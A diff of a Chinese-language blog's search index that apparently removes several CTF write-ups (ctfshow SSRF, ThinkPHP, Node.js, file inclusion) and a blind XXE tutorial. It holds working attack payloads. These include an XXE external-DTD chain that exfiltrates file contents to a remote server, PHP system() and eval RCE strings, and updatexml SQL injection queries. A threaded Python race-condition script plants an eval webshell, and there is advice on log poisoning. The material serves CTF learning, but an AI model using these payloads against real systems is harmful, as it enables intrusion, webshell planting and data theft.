-<h1 id="web357"><a href="#web357" class="headerlink" title="web357"></a>web357</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328194834744.png"  alt="image-20240328194834744"></p>
-<p>FILETER_FLAG_NO_PRIV_RANGE:要求值不在保留的ip范围内</p>
-<p>FILETER_FLAG_NO_RES_RANGE:要求值不在 RFC 指定的私有范围 IP 内</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195426762.png"  alt="image-20240328195426762"></p>
-<p>意思是以上的ip地址都不能用了，就不能用指向了，所以我们用302挑战即可</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240328195527042.png"  alt="image-20240328195527042"></p>
-<h1 id="web358"><a href="#web358" class="headerlink" title="web358"></a>web358</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240328200847412.png"  alt="image-20240328200847412"></p>
-<p>要求url以<code>http://ctf.</code>为开头，show为结尾</p>
-<p>payload:<code>url=http://ctf.@127.0.0.1/flag.php?show</code></p>
-<p>@表示以ctf.用户名访问，?表示get传参</p>
-<h1 id="web359"><a href="#web359" class="headerlink" title="web359"></a>web359</h1>]]></content>
+<p>　<strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p>这里由于没有找到例题，直接抄合天的了</p>
+<p>新学的linux命令</p>
+<p>grep -i “GET” xxx.log</p>
+<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
+]]></content>
       <categories>
-        <category>Write up</category>
+        <category>技术探索</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ThinkPHP-CTFSHOW</title>
-    <url>/2024/04/13/ThinkPHP-ctfshow/</url>
-    <content><![CDATA[<h1 id="挖洞必经之路"><a href="#挖洞必经之路" class="headerlink" title="挖洞必经之路"></a>挖洞必经之路</h1><span id="more"></span>
-
-<p>学</p>
-<p><a class="link"   href="https://static.kancloud.cn/manual/thinkphp/1678" >序言 · ThinkPHP3.2.3完全开发手册 · 看云 (kancloud.cn)<i class="fas fa-external-link-alt"></i></a></p>
-<h1 id="web569"><a href="#web569" class="headerlink" title="web569"></a>web569</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414110912329.png"  alt="image-20240414110912329"></p>
-<p>如题所说，了解pathinfo即可拿到flag</p>
-<p>payload:<code>index.php/admin/login/ctfshowlogin</code></p>
-<h1 id="web570"><a href="#web570" class="headerlink" title="web570"></a>web570</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240414111946911.png"  alt="image-20240414111946911"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240414112855650.png"  alt="image-20240414112855650"></p>
-<p>在给出的附件的Commom&#x2F;Conf.php中找到了这个闭包路由，有个可以执行命令的函数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func()函数第一个参数是要执行的命令，第二个参数是这个命令的参数</span><br></pre></td></tr></table></figure>
-
-<p>比如我们想执行phpinfo()那么我们的payload就是<code>/ctfshow/phpinfo/1</code></p>
-<p>由于在url中使用&#x2F;会被路由替换，所以要把命令逃出来</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload1:/index.php/ctfshow/assert/assert($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br><span class="line">payload2:/index.php/ctfshow/assert/eval($_GET[1])?1=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure>
-
-<p>不知道为什么用两个eval就打不通，估计现在我还理解不了</p>
-<h1 id="web571"><a href="#web571" class="headerlink" title="web571"></a>web571</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240415180500901.png"  alt="image-20240415180500901"></p>
-<p>打开源码发现有可控参数n</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225802599.png"  alt="image-20240415225802599"></p>
-<p>持续跟进函数,最终追到这里</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240415225923394.png"  alt="image-20240415225923394"></p>
-<p>实际上本地调试的时候不是到这里，看别的文章说是题目环境和我的环境不一样的问题</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload:/index.php/Home/index/index?n=&lt;?php system(cat /f*);?&gt;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wrong payload:/index.php/Home/index/index/n/&lt;?php system(cat /f*);?&gt;</span><br><span class="line">按理来说这是path_info的标准格式，但是我发现要是参数有&lt;后面的东西一概不出来，调试功力不足，也看不出</span><br></pre></td></tr></table></figure>
-
-<h1 id="web372"><a href="#web372" class="headerlink" title="web372"></a>web372</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240417105806980.png"  alt="image-20240417105806980"></p>
-<p>爆破+rce</p>
-<p>首先thinkphp的debug模式是自动打开的，也就是说每个报错都会记录到日志中去，这样我们只要读取日志即可</p>
-<p>应该是开发者目录结构设置不好，正常怎么会给进入&#x2F;Application呢</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">日志目录:/Application/Runtime/Logs/模块名/年份_月份_日期.log</span><br></pre></td></tr></table></figure>
-
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240417110114141.png"  alt="image-20240417110114141"></p>
-<p>开扫</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153113112-1713339073489-1.png"  alt="image-20240417153113112"></p>
-<p>会扫出来一个今天的和一个黑客21年留下的后门</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240417153146759.png"  alt="image-20240417153146759"></p>
-<p>顺着这个后门rce即可</p>
-<h1 id="web373"><a href="#web373" class="headerlink" title="web373"></a>web373</h1><p><a class="link"   href="https://blog.csdn.net/qq_50589021/article/details/120616736" >thinkPHP3.2.3sql注入漏洞_think\controller:parsesql方法不存在!-CSDN博客<i class="fas fa-external-link-alt"></i></a></p>
-<p>由于我下的版本是3.2.5，本地没复现成功，就看别人的吧</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//爆表</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1) %23</span><br><span class="line">//爆列名</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;flags&#x27;),0x7e),1) %23</span><br><span class="line">//爆字段值</span><br><span class="line">index.php?id[where]= 1%20and%20updatexml(1,concat(0x7e,substr((select group_concat(flag4s) from flags),16,32),0x7e),1) %23</span><br></pre></td></tr></table></figure>
-
-
-
-<h1 id="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"><a href="#到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退" class="headerlink" title="到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退"></a>到此为止先，想要完整做出一题要审的代码太多，功力不足，撤退</h1>]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>php</tag>
-        <tag>thinkphp</tag>
+        <tag>xml</tag>
       </tags>
   </entry>
   <entry>
@@ -842,72 +828,6 @@
       </categories>
       <tags>
         <tag>php</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>XXE漏洞学习</title>
-    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
-
-<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
-<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
-<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
-<p>2.属性，与html几乎一样</p>
-<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
-<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
-<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
-<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
-<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
-<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
-<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
-<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
-<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
-<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
-<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
-<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
-<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
-<p>创建一个t.dtd文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
-<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
-<p>正常显示</p>
-<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
-<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
-<p>2.%实体名;这个只能在dtd中使用</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
-<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
-<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
-<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
-<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
-<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
-<p>　<strong>xml.php</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>　<strong>test.dtd</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>
-
-<p>　<strong>payload</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
-<p>这里由于没有找到例题，直接抄合天的了</p>
-<p>新学的linux命令</p>
-<p>grep -i “GET” xxx.log</p>
-<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
-]]></content>
-      <categories>
-        <category>技术探索</category>
-      </categories>
-      <tags>
-        <tag>xml</tag>
       </tags>
   </entry>
   <entry>
@@ -981,81 +901,6 @@
       </tags>
   </entry>
   <entry>
-    <title>nodejs-ctfshow</title>
-    <url>/2024/03/02/nodejs-ctfshow/</url>
-    <content><![CDATA[<h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><span id="more"></span>
-
-<h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><p>给了两个源码文件和一个登录界面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303111933863.png"  alt="image-20240303111933863"></p>
-<p>前端可以看到的，以post数据提交用户名和密码，以json格式接受返回数据</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112015481.png"  alt="image-20240303112015481"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303112028812.png"  alt="image-20240303112028812"></p>
-<p>这里给了用户名和密码，然后看了一下登录检验</p>
-<p>用户名不能为CTFSHOW，输入的用户名会经过<code>toUpperCase()</code>转化为大写后与数据比较，密码正常比较。</p>
-<p>既然会转化为大写，直接输入ctfshow(小写)即可</p>
-<h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p>题面</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124252606.png"  alt="image-20240303124252606"></p>
-<p>信息收集</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124304897.png"  alt="image-20240303124304897"></p>
-<p>抓包扫描后无果</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240303124335586.png"  alt="image-20240303124335586"></p>
-<p>传入eval&#x3D;1，出现回显，推测为console.log(传参)，反正能执行我的命令并且输出</p>
-<p>在nodejs中执行系统命令我们主要是使用child_process类</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304175348635.png"  alt="image-20240304175348635"></p>
-<p>可以看到这里有很多方法，有同步和异步创建进程的分类，我们这里需要的是异步创建进程，这里还不是很理解为什么同步创建进程不会有回显(大概是因为主程序没结束，子进程没有执行？)</p>
-<p>先看<code>execSync()</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180214603.png"  alt="image-20240304180214603"></p>
-<p>官方文档看得不是很懂，希望以后有机会研读</p>
-<p>总之应对这题，只需要一个参数command足以</p>
-<p>payload:eval&#x3D;require(‘child_process’).execSync(‘ls’)</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240304180415820.png"  alt="image-20240304180415820"></p>
-<p>发现flag文件，改命令查看即可</p>
-<h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>这题相比上题，ban掉了exec，所以我们用另一个spawn</p>
-<h2 id="第一种方法spwanSync"><a href="#第一种方法spwanSync" class="headerlink" title="第一种方法spwanSync()"></a>第一种方法spwanSync()</h2><p>payload1:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;ls&#39;).stdout.toString()</code></p>
-<p>payload2:<code>eval=require(&#39;child_process&#39;).spawnSync(&#39;tac&#39;,[&#39;fl001g.txt&#39;]).stdout.toString()</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305181344645.png"  alt="image-20240305181344645"></p>
-<p>学习一下<code>spawnSync()</code>方法</p>
-<p><code>spawnSync()</code>会同步创建一个子进程执行我们传入的命令，并且返回一个对象.</p>
-<h3 id="传入命令"><a href="#传入命令" class="headerlink" title="传入命令"></a>传入命令</h3><p>第一个参数是命令的名称</p>
-<p>第二个参数是一个数组，用来传递命令的参数</p>
-<h3 id="返回的对象"><a href="#返回的对象" class="headerlink" title="返回的对象"></a>返回的对象</h3><p>返回的这个对象包含命令执行后的信息</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305182634001.png"  alt="image-20240305182634001"></p>
-<p>这里我们需要的是标准输出流stdout，并用toString()将它转化为字符串即可输出</p>
-<h2 id="第二种方法-fs类"><a href="#第二种方法-fs类" class="headerlink" title="第二种方法 fs类"></a>第二种方法 fs类</h2><h3 id="两个魔术变量"><a href="#两个魔术变量" class="headerlink" title="两个魔术变量"></a>两个魔术变量</h3><p>__filename:返回当前模块文件被解析过后的绝对路径</p>
-<p>__dirname:返回当前模块文件解析后所在的文件夹的绝对路径</p>
-<h3 id="readdirSync和readFileSync"><a href="#readdirSync和readFileSync" class="headerlink" title="readdirSync和readFileSync"></a>readdirSync和readFileSync</h3><p>payload1:<code>eval=require(&#39;fs&#39;).readdirSync(&#39;.&#39;)</code>查看当前目录下的文件</p>
-<p>payload2:<code>eval=require(&#39;fs&#39;).readFileSync(&#39;fl001g.txt&#39;,&#39;utf-8&#39;)</code>查看文件</p>
-<h3 id="exec绕过"><a href="#exec绕过" class="headerlink" title="exec绕过"></a>exec绕过</h3><p>payload:?<code>eval=require(&#39;child_process&#39;)[&#39;exe&#39;+&#39;cSync&#39;](&#39;ls&#39;).toString()</code></p>
-<p>这里有个疑点，如果我想读取上一层目录的文件该如何处理,以后再想吧</p>
-<h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240305201256890.png"  alt="image-20240305201256890"></p>
-<p>要求，传入两个数ab</p>
-<p>1.a的长度和b的长度一致</p>
-<p>2.a不等于b</p>
-<p>3.md5编码后的a+flag和b+flag相等</p>
-<h2 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h2><p>这里我们的payload为a[]&#x3D;1&amp;b[]&#x3D;1</p>
-<p>1.数组.length即数组元素个数，满足相等</p>
-<p>2.JavaScript会比较等号两边数组的地址，弱不一样直接返回false(但是php不会)</p>
-<p>3.上本地测试图</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202533805.png"  alt="image-20240305202533805"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202543607.png"  alt="image-20240305202543607"></p>
-<p>ok了</p>
-<p>再看看如果数组里面有两个元素呢</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305202622579.png"  alt="image-20240305202622579"></p>
-<h2 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h2><p>payload:a[‘x’]&#x3D;1&amp;b[‘x’]&#x3D;1</p>
-<p>原理与上差不多相同，不过输出的东西不太同</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240305203029034.png"  alt="image-20240305203029034"></p>
-<h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>原型链污染</p>
-<p>移步下一篇文章</p>
-]]></content>
-      <categories>
-        <category>Write up</category>
-      </categories>
-      <tags>
-        <tag>ctf</tag>
-        <tag>Nodejs</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>记录一题好玩的游戏题</title>
     <url>/2024/05/09/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%A2%98%E5%A5%BD%E7%8E%A9%E7%9A%84%E6%B8%B8%E6%88%8F%E9%A2%98/</url>
     <content><![CDATA[<h1 id="我给五星"><a href="#我给五星" class="headerlink" title="我给五星"></a>我给五星</h1><span id="more"></span>
@@ -1086,68 +931,6 @@
       <tags>
         <tag>ctf</tag>
         <tag>javascript</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>文件包含漏洞</title>
-    <url>/2024/03/13/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>开</p>
-<span id="more"></span>
-
-<h1 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a>web 79</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313101524315.png"  alt="image-20240313101524315"></p>
-<p><code>file=data://plain/text,&lt;?= &#39;tac flag.php&#39;?&gt;</code><?echo 1?>等于<?= 1?>,需要打开short_open_tag</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="line">PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs ===&gt; &lt;?php system(&#x27;cat flag.php&#x27;);</span><br></pre></td></tr></table></figure>
-
-<h1 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a>web 80</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111931278.png"  alt="image-20240313111931278"></p>
-<p>新姿势，包含目录文件</p>
-<p>目录文件会记录我们的ua，浏览器的一些信息，那我们在ua插入php代码，再让include包含并执行，就可以getshell，先包含</p>
-<p>Nginx:&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p>
-<p>Apache:&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</p>
-<p>或许还可以试试有没有error.log</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111318671.png"  alt="image-20240313111318671"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111708459.png"  alt="image-20240313111708459"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240313111721356.png"  alt="image-20240313111721356"></p>
-<p>得吃</p>
-<p>当然你也可以让file包含你服务器的木马文件，然后直接上线它的服务器也可以</p>
-<h1 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a>web 81</h1><p><img   src="/../img/$%7Bfiilename%7D/image-20240313111952192.png"  alt="image-20240313111952192"></p>
-<p>多过滤了一个:</p>
-<p>和上题一样，不能请求自己服务器的木马而已</p>
-<h1 id="web-82-86"><a href="#web-82-86" class="headerlink" title="web 82-86"></a>web 82-86</h1><p><a href="https://blog.csdn.net/qq_46918279/article/details/120106832">CTFSHOW-文件包含_highlight_file(<strong>file</strong>);-CSDN博客</a></p>
-<p>进行一个新知识的学</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"> </span><br><span class="line">url=<span class="string">&#x27;http://08d4a04e-19b3-4049-8a81-e9c6226eee2f.challenge.ctf.show:8080/&#x27;</span></span><br><span class="line"><span class="comment">#设置PHPSESSID的值</span></span><br><span class="line">sessionid=<span class="string">&#x27;ctfshow&#x27;</span>     </span><br><span class="line">data=&#123;<span class="string">&quot;1&quot;</span>:<span class="string">&quot;file_put_contents(&#x27;/var/www/html/tao.php&#x27;,&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;);&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#为了进行条件竞争，需要一边写一边读</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#进行上传文件时需要post传递名为PHP_SESSION_UPLOAD_PROGRESS值为一句话木马</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">	fileBytes = io.BytesIO(<span class="string">b&#x27;a&#x27;</span>*<span class="number">1024</span>*<span class="number">50</span>)          <span class="comment">#生产一个50k的文件</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url,</span><br><span class="line">			data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>:<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">			cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>:sessionid&#125;,</span><br><span class="line">			files=&#123;<span class="string">&#x27;file&#x27;</span>:(<span class="string">&#x27;ctfshow.jpg&#x27;</span>,fileBytes)&#125;    <span class="comment">#设置文件名字和内容</span></span><br><span class="line">			)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#读取session文件，这里文件为/tmp/sess_ctfshow</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		response=session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessionid,data=data)</span><br><span class="line">		response2=session.get(url+<span class="string">&#x27;tao.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">if</span> response2.status_code==<span class="number">200</span>:</span><br><span class="line">			<span class="built_in">print</span>(<span class="string">&#x27;++++++++++++++++++++&#x27;</span>)</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="built_in">print</span>(response2.status_code)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> </span><br><span class="line">	<span class="comment">#开启多线程进行竞争	</span></span><br><span class="line">	evnet=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:			</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	evnet.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure>
-
-
-
